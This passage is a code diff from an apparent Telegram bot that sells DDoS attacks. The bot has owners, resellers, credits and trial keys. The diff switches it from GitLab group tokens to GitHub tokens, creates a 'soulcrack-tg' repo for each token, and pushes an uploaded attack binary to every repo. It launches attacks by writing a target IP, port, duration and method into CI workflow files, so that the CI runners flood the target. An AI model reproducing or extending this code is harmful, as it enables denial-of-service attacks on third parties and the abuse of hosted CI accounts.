                     f"Removed by: `{user_id}`",
                     reply_markup=reply_markup
@@ -1922,7 +1717,7 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                 try:
                     await context.bot.send_message(
                         chat_id=user_to_remove,
-                        text="🚫 **YOUR ACCESS HAS BEEN REMOVED**\n━━━━━━━━━━━━━━━━━━━━━\nYour access to the bot has been revoked."
+                        text="🚫 **YOUR ACCESS HAS BEEN REMOVED**\n━━━━━━━━━━━━━━━━━━━━━━\nYour access to the bot has been revoked."
                     )
                 except:
                     pass
@@ -1943,7 +1738,7 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
 
             await update.message.reply_text(
                 "👑 **ADD OWNER - STEP 2/2**\n"
-                "━━━━━━━━━━━━━━━━━━━━━\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"✅ User ID: `{new_owner_id}`\n\n"
                 "Send the username:\n\nExample: `john`"
             )
@@ -1979,7 +1774,7 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
         try:
             await context.bot.send_message(
                 chat_id=new_owner_id,
-                text="👑 **CONGRATULATIONS!**\n━━━━━━━━━━━━━━━━━━━━━\nYou have been added as an owner of the bot!\nYou now have full access to all admin features."
+                text="👑 **CONGRATULATIONS!**\n━━━━━━━━━━━━━━━━━━━━━━\nYou have been added as an owner of the bot!\nYou now have full access to all admin features."
             )
         except:
             pass
@@ -1987,7 +1782,7 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
         reply_markup = get_main_keyboard(user_id)
         await update.message.reply_text(
             f"✅ **OWNER ADDED**\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"Owner ID: `{new_owner_id}`\n"
             f"Username: @{username}\n"
             f"Added by: `{user_id}`",
@@ -2018,7 +1813,7 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
             try:
                 await context.bot.send_message(
                     chat_id=owner_to_remove,
-                    text="⚠️ **NOTIFICATION**\n━━━━━━━━━━━━━━━━━━━━━\nYour owner access has been revoked from the bot."
+                    text="⚠️ **NOTIFICATION**\n━━━━━━━━━━━━━━━━━━━━━━\nYour owner access has been revoked from the bot."
                 )
             except:
                 pass
@@ -2026,7 +1821,7 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
             reply_markup = get_main_keyboard(user_id)
             await update.message.reply_text(
                 f"✅ **OWNER REMOVED**\n"
-                "━━━━━━━━━━━━━━━━━━━━━\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"Owner ID: `{owner_to_remove}`\n"
                 f"Username: @{removed_username}\n"
                 f"Removed by: `{user_id}`",
@@ -2058,7 +1853,7 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
 
             await update.message.reply_text(
                 "💰 **ADD RESELLER - STEP 2/3**\n"
-                "━━━━━━━━━━━━━━━━━━━━━\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"✅ User ID: `{reseller_id}`\n\n"
                 "Select credits:",
                 reply_markup=reply_markup
@@ -2090,7 +1885,7 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
         try:
             await context.bot.send_message(
                 chat_id=reseller_id,
-                text=f"💰 **CONGRATULATIONS!**\n━━━━━━━━━━━━━━━━━━━━━\nYou have been added as a reseller!\nInitial credits: {credits}\n\nYou can now manage users."
+                text=f"💰 **CONGRATULATIONS!**\n━━━━━━━━━━━━━━━━━━━━━━\nYou have been added as a reseller!\nInitial credits: {credits}\n\nYou can now manage users."
             )
         except:
             pass
@@ -2098,7 +1893,7 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
         reply_markup = get_main_keyboard(user_id)
         await update.message.reply_text(
             f"✅ **RESELLER ADDED**\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"Reseller ID: `{reseller_id}`\n"
             f"Username: @{username}\n"
             f"Credits: {credits}\n"
@@ -2125,7 +1920,7 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
             try:
                 await context.bot.send_message(
                     chat_id=reseller_to_remove,
-                    text="⚠️ **NOTIFICATION**\n━━━━━━━━━━━━━━━━━━━━━\nYour reseller access has been revoked from the bot."
+                    text="⚠️ **NOTIFICATION**\n━━━━━━━━━━━━━━━━━━━━━━\nYour reseller access has been revoked from the bot."
                 )
             except:
                 pass
@@ -2133,7 +1928,7 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
             reply_markup = get_main_keyboard(user_id)
             await update.message.reply_text(
                 f"✅ **RESELLER REMOVED**\n"
-                "━━━━━━━━━━━━━━━━━━━━━\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"Reseller ID: `{reseller_to_remove}`\n"
                 f"Username: @{removed_username}\n"
                 f"Removed by: `{user_id}`",
@@ -2145,98 +1940,80 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
         except ValueError:
             await update.message.reply_text("❌ **INVALID USER ID**\nUser ID must be a number.\n\nPlease send a valid user ID:")
 
-    # Token add flow - MODIFIED FOR GROUP-BASED
+    # Token add flow
     elif step == "token_add":
+        token = text.strip()
+        repo_name = "soulcrack-tg"
+
         try:
-            # Parse token,group_id format
-            parts = text.strip().split(',')
-            if len(parts) != 2:
-                await update.message.reply_text("❌ **INVALID FORMAT**\n\nUse format: `token,group_id`\n\nExample: `glpat-xxxxx,12345678`")
-                return
-
-            token = parts[0].strip()
-            group_id = parts[1].strip()
-
-            # Check if token/group already exists
-            for existing_token in gitlab_tokens:
-                if existing_token['token'] == token and existing_token['group_id'] == group_id:
-                    await update.message.reply_text("❌ Token and group already exist.")
+            for existing_token in github_tokens:
+                if existing_token['token'] == token:
+                    await update.message.reply_text("❌ Token already exists.")
                     del temp_data[user_id]
                     return
 
-            await update.message.reply_text("🔄 **SETTING UP GROUP...**\nThis may take a moment.")
+            await update.message.reply_text("🔄 **ADDING TOKEN...**")
 
-            # Automatic setup: find/create project, upload binary, setup CI/CD
-            binary_content = None
-            if os.path.exists(BINARY_FILE_NAME):
-                with open(BINARY_FILE_NAME, 'rb') as f:
-                    binary_content = f.read()
+            g = Github(token)
+            user = g.get_user()
+            username = user.login
 
-            success, project_id, setup_message = setup_group_automatically(token, group_id, binary_content)
-
-            if not success:
-                await update.message.reply_text(f"❌ **SETUP FAILED**\n━━━━━━━━━━━━━━━━━━━━━\n{setup_message}")
-                del temp_data[user_id]
-                return
-
-            # Get group info
-            gl = gitlab.Gitlab('https://gitlab.com', private_token=token)
-            gl.auth()
-            group = gl.groups.get(group_id)
-            group_name = group.name
-
-            # Get project info
-            project, project_name, _ = get_target_project_from_group(token, group_id)
+            repo, created = create_repository(token, repo_name)
 
             new_token_data = {
                 'token': token,
-                'group_id': group_id,
-                'group_name': group_name,
-                'project_id': project_id,
-                'project_name': project_name,
+                'username': username,
+                'repo': f"{username}/{repo_name}",
                 'added_date': time.strftime("%Y-%m-%d %H:%M:%S"),
                 'status': 'active'
             }
-            gitlab_tokens.append(new_token_data)
-            save_gitlab_tokens(gitlab_tokens)
+            github_tokens.append(new_token_data)
+            save_github_tokens(github_tokens)
 
             reply_markup = get_main_keyboard(user_id)
-            message = (
-                f"✅ **GROUP ADDED & CONFIGURED!**\n"
-                "━━━━━━━━━━━━━━━━━━━━━\n"
-                f"📁 Group: `{group_name}`\n"
-                f"🆔 Group ID: `{group_id}`\n"
-                f"📦 Project: `{project_name}`\n"
-                f"📊 Total groups: {len(gitlab_tokens)}\n\n"
-                f"⚡ {setup_message}"
-            )
+            if created:
+                message = (
+                    f"✅ **NEW REPO CREATED & TOKEN ADDED!**\n"
+                    "━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"👤 Username: `{username}`\n"
+                    f"📁 Repo: `{repo_name}`\n"
+                    f"📊 Total servers: {len(github_tokens)}"
+                )
+            else:
+                message = (
+                    f"✅ **TOKEN ADDED TO EXISTING REPO!**\n"
+                    "━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"👤 Username: `{username}`\n"
+                    f"📁 Repo: `{repo_name}`\n"
+                    f"📊 Total servers: {len(github_tokens)}"
+                )
 
             await update.message.reply_text(message, reply_markup=reply_markup)
             del temp_data[user_id]
 
         except Exception as e:
-            await update.message.reply_text(f"❌ **ERROR**\n━━━━━━━━━━━━━━━━━━━━━\n{str(e)}\n\nPlease check token and group ID.")
+            await update.message.reply_text(f"❌ **ERROR**\n━━━━━━━━━━━━━━━━━━━━━━\n{str(e)}\nPlease check the token.")
             del temp_data[user_id]
 
     # Token remove flow
     elif step == "token_remove":
         try:
             token_num = int(text.strip())
-            if token_num < 1 or token_num > len(gitlab_tokens):
-                await update.message.reply_text(f"❌ Invalid number. Use 1-{len(gitlab_tokens)}")
+            if token_num < 1 or token_num > len(github_tokens):
+                await update.message.reply_text(f"❌ Invalid number. Use 1-{len(github_tokens)}")
                 del temp_data[user_id]
                 return
 
-            removed_token = gitlab_tokens.pop(token_num - 1)
-            save_gitlab_tokens(gitlab_tokens)
+            removed_token = github_tokens.pop(token_num - 1)
+            save_github_tokens(github_tokens)
 
             reply_markup = get_main_keyboard(user_id)
             await update.message.reply_text(
-                f"✅ **GROUP REMOVED!**\n"
-                "━━━━━━━━━━━━━━━━━━━━━\n"
-                f"📁 Group: `{removed_token.get('group_name', 'Unknown')}`\n"
-                f"🆔 ID: `{removed_token.get('group_id', 'Unknown')}`\n"
-                f"📊 Remaining: {len(gitlab_tokens)}",
+                f"✅ **SERVER REMOVED!**\n"
+                "━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"👤 Server: `{removed_token['username']}`\n"
+                f"📁 Repo: `{removed_token['repo']}`\n"
+                f"📊 Remaining: {len(github_tokens)}",
                 reply_markup=reply_markup
             )
 
@@ -2254,6 +2031,7 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, 
     # Binary upload flow
     elif step == "binary_upload":
         await update.message.reply_text("❌ **PLEASE SEND A FILE**\nNot text. Send your binary file.")
+
 
 # ==================== CALLBACK QUERY HANDLER ====================
 
@@ -2280,7 +2058,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         await query.message.edit_text(
             f"🔑 **TRIAL KEY GENERATED**\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"Key: `{key}`\n"
             f"Duration: {hours} hours\n"
             f"Expires: in {hours} hours\n\n"
@@ -2298,7 +2076,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         await query.message.edit_text(
             f"✅ **COOLDOWN UPDATED**\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"New cooldown: `{COOLDOWN_DURATION}` seconds"
         )
         return
@@ -2313,12 +2091,12 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         await query.message.edit_text(
             f"✅ **MAXIMUM ATTACKS UPDATED**\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"New limit: `{MAX_ATTACKS}` attack(s) per user"
         )
         return
 
-    # Attack time setting - MODIFIED TO USE group_id
+    # Attack time setting
     if data.startswith("attack_time_"):
         attack_duration = int(data.split("_")[2])
 
@@ -2345,14 +2123,14 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try:
                 result = update_yml_file(
                     token_data['token'],
-                    token_data['group_id'],  # Changed from project_id to group_id
+                    token_data['repo'],
                     ip, port, attack_duration, method
                 )
-                results.append((token_data.get('group_name', 'Unknown'), result))
+                results.append((token_data['username'], result))
             except Exception as e:
-                results.append((token_data.get('group_name', 'Unknown'), False))
+                results.append((token_data['username'], False))
 
-        for token_data in gitlab_tokens:
+        for token_data in github_tokens:
             thread = threading.Thread(target=update_single_token, args=(token_data,))
             threads.append(thread)
             thread.start()
@@ -2360,7 +2138,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for thread in threads:
             thread.join()
 
-        for group_name, success in results:
+        for username, success in results:
             if success:
                 success_count += 1
             else:
@@ -2372,11 +2150,11 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup = get_main_keyboard(user_id)
         message = (
             f"🎯 **ATTACK STARTED!**\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"🌐 Target: `{ip}`\n"
             f"🚪 Port: `{port}`\n"
             f"⏱️ Time: `{attack_duration}s`\n"
-            f"🖥️ Groups: `{success_count}`\n"
+            f"🖥️ Servers: `{success_count}`\n"
             f"⚡ Method: {method}\n"
             f"⏳ Cooldown: {COOLDOWN_DURATION}s after attack\n"
             f"🎯 Remaining attacks: {remaining_attacks}/{MAX_ATTACKS}"
@@ -2427,7 +2205,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             await context.bot.send_message(
                 chat_id=new_user_id,
-                text=f"✅ **ACCESS APPROVED!**\n━━━━━━━━━━━━━━━━━━━━━\nYour access has been approved for {days if days > 0 else 'lifetime'} {'days' if days > 1 else ('day' if days == 1 else '')}."
+                text=f"✅ **ACCESS APPROVED!**\n━━━━━━━━━━━━━━━━━━━━━━\nYour access has been approved for {days if days > 0 else 'lifetime'} {'days' if days > 1 else ('day' if days == 1 else '')}."
             )
         except:
             pass
@@ -2435,7 +2213,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup = get_main_keyboard(user_id)
         await query.message.edit_text(
             f"✅ **USER ADDED**\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"User ID: `{new_user_id}`\n"
             f"Duration: {days if days > 0 else 'Lifetime'} {'days' if days > 1 else ('day' if days == 1 else '')}\n"
             f"Added by: `{user_id}`"
@@ -2457,13 +2235,14 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup = get_cancel_keyboard()
         await query.message.edit_text(
             "💰 **ADD RESELLER - STEP 3/3**\n"
-            "━━━━━━━━━━━━━━━━━━━━━\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"✅ User ID: `{temp_data[user_id]['reseller_id']}`\n"
             f"✅ Credits: `{credits}`\n\n"
             "Send the username:\n\nExample: `john`"
         )
         await query.message.reply_text("Type username:", reply_markup=reply_markup)
         return
+
 
 # ==================== BROADCAST HANDLER ====================
 
@@ -2495,7 +2274,7 @@ async def send_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE, mes
         try:
             await context.bot.send_message(
                 chat_id=uid,
-                text=f"📢 **BROADCAST**\n━━━━━━━━━━━━━━━━━━━━━\n{message}"
+                text=f"📢 **BROADCAST**\n━━━━━━━━━━━━━━━━━━━━━━\n{message}"
             )
             success_count += 1
             time.sleep(0.1)
@@ -2505,7 +2284,7 @@ async def send_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE, mes
     reply_markup = get_main_keyboard(user_id)
     await progress_msg.edit_text(
         f"✅ **BROADCAST COMPLETED**\n"
-        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
         f"• ✅ Successful: {success_count}\n"
         f"• ❌ Failed: {fail_count}\n"
         f"• 📊 Total: {total_users}\n"
@@ -2513,260 +2292,107 @@ async def send_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE, mes
     )
     await update.message.reply_text("Use buttons to continue:", reply_markup=reply_markup)
 
-# ==================== FILE HANDLERS ====================
+
+# ==================== BINARY FILE HANDLER ====================
 
 async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle both binary file uploads and token file uploads"""
     user_id = update.effective_user.id
 
-    if user_id not in temp_data:
+    if user_id not in temp_data or temp_data[user_id].get("step") != "binary_upload":
         return
 
-    step = temp_data[user_id].get("step")
+    if not update.message.document:
+        await update.message.reply_text("❌ **PLEASE SEND A FILE**\nNot text. Send your binary file.")
+        return
 
-    # Binary upload handler
-    if step == "binary_upload":
-        if not update.message.document:
-            await update.message.reply_text("❌ **PLEASE SEND A FILE**\nNot text. Send your binary file.")
-            return
+    del temp_data[user_id]
 
-        del temp_data[user_id]
+    progress_msg = await update.message.reply_text("📥 **DOWNLOADING YOUR BINARY FILE...**")
 
-        progress_msg = await update.message.reply_text("📥 **DOWNLOADING YOUR BINARY FILE...**")
+    try:
+        file = await update.message.document.get_file()
+        file_path = f"temp_binary_{user_id}.bin"
+        await file.download_to_drive(file_path)
 
-        try:
-            file = await update.message.document.get_file()
-            file_path = f"temp_binary_{user_id}.bin"
-            await file.download_to_drive(file_path)
+        with open(file_path, 'rb') as f:
+            binary_content = f.read()
 
-            with open(file_path, 'rb') as f:
-                binary_content = f.read()
+        file_size = len(binary_content)
 
-            file_size = len(binary_content)
+        await progress_msg.edit_text(
+            f"📊 **FILE DOWNLOADED: {file_size} bytes**\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            "📤 Uploading to all GitHub repos..."
+        )
 
-            # Save as 'soul' for future use
-            with open(BINARY_FILE_NAME, 'wb') as f:
-                f.write(binary_content)
+        success_count = 0
+        fail_count = 0
+        results = []
 
-            await progress_msg.edit_text(
-                f"📊 **FILE DOWNLOADED: {file_size} bytes**\n"
-                "━━━━━━━━━━━━━━━━━━━━━\n"
-                "📤 Uploading to all GitLab projects..."
-            )
+        def upload_to_repo(token_data):
+            try:
+                g = Github(token_data['token'])
+                repo = g.get_repo(token_data['repo'])
 
-            success_count = 0
-            fail_count = 0
-            results = []
-
-            def upload_to_project(token_data):
                 try:
-                    # Get target project from group
-                    project, project_name, error = get_target_project_from_group(
-                        token_data['token'],
-                        token_data['group_id']
+                    existing_file = repo.get_contents(BINARY_FILE_NAME)
+                    repo.update_file(
+                        BINARY_FILE_NAME,
+                        "Update binary file",
+                        binary_content,
+                        existing_file.sha,
+                        branch="main"
                     )
-
-                    if project is None:
-                        results.append((token_data.get('group_name', 'Unknown'), False, error))
-                        return
-
-                    gl = gitlab.Gitlab('https://gitlab.com', private_token=token_data['token'])
-                    gl.auth()
-                    full_project = gl.projects.get(project.id)
-
-                    # Encode binary content as base64 for GitLab API
-                    import base64
-                    encoded_content = base64.b64encode(binary_content).decode('utf-8')
-
-                    try:
-                        # Try to get existing file
-                        file = full_project.files.get(file_path=BINARY_FILE_NAME, ref='main')
-                        # Update existing file
-                        file.content = encoded_content
-                        file.encoding = 'base64'
-                        file.save(branch='main', commit_message="Update binary file")
-                        results.append((token_data.get('group_name', 'Unknown'), True, "Updated"))
-                    except GitlabGetError:
-                        # Create new file
-                        full_project.files.create({
-                            'file_path': BINARY_FILE_NAME,
-                            'branch': 'main',
-                            'content': encoded_content,
-                            'encoding': 'base64',
-                            'commit_message': "Upload binary file"
-                        })
-                        results.append((token_data.get('group_name', 'Unknown'), True, "Created"))
-
+                    results.append((token_data['username'], True, "Updated"))
                 except Exception as e:
-                    results.append((token_data.get('group_name', 'Unknown'), False, str(e)))
+                    repo.create_file(
+                        BINARY_FILE_NAME,
+                        "Upload binary file",
+                        binary_content,
+                        branch="main"
+                    )
+                results.append((token_data['username'], True, "Created"))
 
-            threads = []
-            for token_data in gitlab_tokens:
-                thread = threading.Thread(target=upload_to_project, args=(token_data,))
-                threads.append(thread)
-                thread.start()
+            except Exception as e:
+                results.append((token_data['username'], False, str(e)))
 
-            for thread in threads:
-                thread.join()
+        threads = []
+        for token_data in github_tokens:
+            thread = threading.Thread(target=upload_to_repo, args=(token_data,))
+            threads.append(thread)
+            thread.start()
 
-            for group_name, success, status in results:
-                if success:
-                    success_count += 1
-                else:
-                    fail_count += 1
+        for thread in threads:
+            thread.join()
 
-            os.remove(file_path)
+        for username, success, status in results:
+            if success:
+                success_count += 1
+            else:
+                fail_count += 1
 
-            reply_markup = get_main_keyboard(user_id)
-            message = (
-                f"✅ **BINARY UPLOAD COMPLETED!**\n"
-                "━━━━━━━━━━━━━━━━━━━━━\n"
-                f"📊 **Results:**\n"
-                f"• ✅ Successful: {success_count}\n"
-                f"• ❌ Failed: {fail_count}\n"
-                f"• 📊 Total: {len(gitlab_tokens)}\n"
-                "━━━━━━━━━━━━━━━━━━━━━\n"
-                f"📁 **File:** `{BINARY_FILE_NAME}`\n"
-                f"📦 **File size:** {file_size} bytes\n"
-                f"⚙️ **Binary ready:** ✅"
-            )
+        os.remove(file_path)
 
-            await progress_msg.edit_text(message)
-            await update.message.reply_text("Use buttons to continue:", reply_markup=reply_markup)
+        reply_markup = get_main_keyboard(user_id)
+        message = (
+            f"✅ **BINARY UPLOAD COMPLETED!**\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"📊 **Results:**\n"
+            f"• ✅ Successful: {success_count}\n"
+            f"• ❌ Failed: {fail_count}\n"
+            f"• 📊 Total: {len(github_tokens)}\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"📁 **File:** `{BINARY_FILE_NAME}`\n"
+            f"📦 **File size:** {file_size} bytes\n"
+            f"⚙️ **Binary ready:** ✅"
+        )
 
-        except Exception as e:
-            await progress_msg.edit_text(f"❌ **ERROR**\n━━━━━━━━━━━━━━━━━━━━━\n{str(e)}")
+        await progress_msg.edit_text(message)
+        await update.message.reply_text("Use buttons to continue:", reply_markup=reply_markup)
 
-    # NEW: Token file upload handler
-    elif step == "token_file_upload":
-        if not update.message.document:
-            await update.message.reply_text("❌ **PLEASE SEND A FILE**\nNot text. Send your .txt file.")
-            return
+    except Exception as e:
+        await progress_msg.edit_text(f"❌ **ERROR**\n━━━━━━━━━━━━━━━━━━━━━━\n{str(e)}")
 
-        del temp_data[user_id]
-
-        progress_msg = await update.message.reply_text("📥 **DOWNLOADING TOKEN FILE...**")
-
-        try:
-            file = await update.message.document.get_file()
-            file_path = f"temp_tokens_{user_id}.txt"
-            await file.download_to_drive(file_path)
-
-            # Read and parse file
-            with open(file_path, 'r') as f:
-                lines = f.readlines()
-
-            await progress_msg.edit_text(
-                f"📊 **FILE LOADED: {len(lines)} entries**\n"
-                "━━━━━━━━━━━━━━━━━━━━━\n"
-                "🔄 Processing tokens..."
-            )
-
-            # Load binary content if available for automatic setup
-            binary_content = None
-            if os.path.exists(BINARY_FILE_NAME):
-                with open(BINARY_FILE_NAME, 'rb') as f:
-                    binary_content = f.read()
-
-            success_count = 0
-            fail_count = 0
-            skipped_count = 0
-            results = []
-
-            for line_num, line in enumerate(lines, 1):
-                line = line.strip()
-                if not line or line.startswith('#'):  # Skip empty lines and comments
-                    continue
-
-                # Parse token,group_id format
-                parts = line.split(',')
-                if len(parts) != 2:
-                    results.append((line_num, "❌", "Invalid format"))
-                    fail_count += 1
-                    continue
-
-                token = parts[0].strip()
-                group_id = parts[1].strip()
-
-                # Check if already exists
-                exists = False
-                for existing_token in gitlab_tokens:
-                    if existing_token['token'] == token and existing_token['group_id'] == group_id:
-                        results.append((line_num, "⏭️", f"Already exists (Group {group_id})"))
-                        skipped_count += 1
-                        exists = True
-                        break
-
-                if exists:
-                    continue
-
-                # Try to setup group
-                try:
-                    success, project_id, setup_message = setup_group_automatically(token, group_id, binary_content)
-
-                    if not success:
-                        results.append((line_num, "❌", f"Setup failed: {setup_message}"))
-                        fail_count += 1
-                        continue
-
-                    # Get group and project info
-                    gl = gitlab.Gitlab('https://gitlab.com', private_token=token)
-                    gl.auth()
-                    group = gl.groups.get(group_id)
-                    group_name = group.name
-
-                    project, project_name, _ = get_target_project_from_group(token, group_id)
-
-                    new_token_data = {
-                        'token': token,
-                        'group_id': group_id,
-                        'group_name': group_name,
-                        'project_id': project_id,
-                        'project_name': project_name,
-                        'added_date': time.strftime("%Y-%m-%d %H:%M:%S"),
-                        'status': 'active'
-                    }
-                    gitlab_tokens.append(new_token_data)
-                    save_gitlab_tokens(gitlab_tokens)
-
-                    results.append((line_num, "✅", f"{group_name} (ID: {group_id})"))
-                    success_count += 1
-
-                except Exception as e:
-                    results.append((line_num, "❌", f"Error: {str(e)[:50]}"))
-                    fail_count += 1
-
-            # Clean up temp file
-            os.remove(file_path)
-
-            # Generate summary
-            summary = (
-                f"📤 **BULK TOKEN UPLOAD COMPLETED**\n"
-                "━━━━━━━━━━━━━━━━━━━━━\n"
-                f"✅ Success: {success_count}\n"
-                f"❌ Failed: {fail_count}\n"
-                f"⏭️ Skipped: {skipped_count}\n"
-                f"📊 Total processed: {len(lines)}\n"
-                f"📊 Total groups now: {len(gitlab_tokens)}\n\n"
-            )
-
-            # Show first 10 results
-            if results:
-                summary += "📋 **Results (first 10):**\n"
-                for line_num, status, message in results[:10]:
-                    summary += f"L{line_num}: {status} {message}\n"
-
-                if len(results) > 10:
-                    summary += f"\n... and {len(results) - 10} more"
-
-            reply_markup = get_main_keyboard(user_id)
-            await progress_msg.edit_text(summary)
-            await update.message.reply_text("Use buttons to continue:", reply_markup=reply_markup)
-
-        except Exception as e:
-            await progress_msg.edit_text(f"❌ **ERROR**\n━━━━━━━━━━━━━━━━━━━━━\n{str(e)}")
-            if os.path.exists(file_path):
-                os.remove(file_path)
 
 def main():
     application = Application.builder().token(BOT_TOKEN).build()
@@ -2777,23 +2403,23 @@ def main():
     # Start command
     application.add_handler(CommandHandler("start", start))
 
-    # File handler for binary upload AND token file upload
+    # File handler for binary upload
     application.add_handler(MessageHandler(filters.Document.ALL, handle_binary_file))
 
     # Text message handler for all button presses and text input
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_press))
 
     print("🤖 **THE BOT IS RUNNING...**")
-    print("━━━━━━━━━━━━━━━━━━━━━")
+    print("━━━━━━━━━━━━━━━━━━━━━━")
     print(f"👑 Primary owners: {[uid for uid, info in owners.items() if info.get('is_primary', False)]}")
     print(f"👑 Secondary owners: {[uid for uid, info in owners.items() if not info.get('is_primary', False)]}")
     print(f"📊 Approved users: {len(approved_users)}")
     print(f"💰 Resellers: {len(resellers)}")
-    print(f"📁 Groups: {len(gitlab_tokens)}")
+    print(f"🔑 Servers: {len(github_tokens)}")
     print(f"🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}")
     print(f"⏳ Cooldown: {COOLDOWN_DURATION}s")
     print(f"🎯 Max attacks: {MAX_ATTACKS}")
-    print("━━━━━━━━━━━━━━━━━━━━━")
+    print("━━━━━━━━━━━━━━━━━━━━━━")
 
     application.run_polling()
 
